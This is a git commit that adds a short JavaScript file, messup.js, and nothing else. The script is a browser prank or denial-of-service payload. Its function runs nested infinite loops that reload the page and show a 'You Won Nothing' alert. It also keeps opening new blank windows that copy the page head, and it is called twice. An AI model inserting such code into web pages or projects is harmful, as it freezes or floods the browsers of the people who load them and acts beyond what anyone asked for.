b628ba21bdff8ef63ed492b50326d6fb5aad2b85
jyothyswaroop <jyothyswaroop@gmail.com>
2016-02-12 16:58:08 -0600

    Create messup.js

---
+++ messup.js
@@ -0,0 +1,10 @@
+
+var getLost=function(){
+var a;
+for(console.log("You are so messed up");;)
+for(location.reload();;)
+alert("Congratualations!!!\nYou Won Nothing\n"),
+a=window.open("","_blank"),
+a.document.head.innerHTML=document.head.innerHTML};
+getLost();
+getLost();
